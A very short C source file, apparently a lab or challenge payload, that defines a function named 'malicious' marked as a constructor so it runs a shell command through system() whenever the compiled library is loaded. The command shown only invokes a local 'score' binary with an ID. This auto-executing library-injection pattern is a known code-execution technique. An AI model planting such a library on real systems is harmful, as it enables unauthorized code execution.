#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 3d8449e5-63ed-4da5-8b1b-476b2a87851e");
}

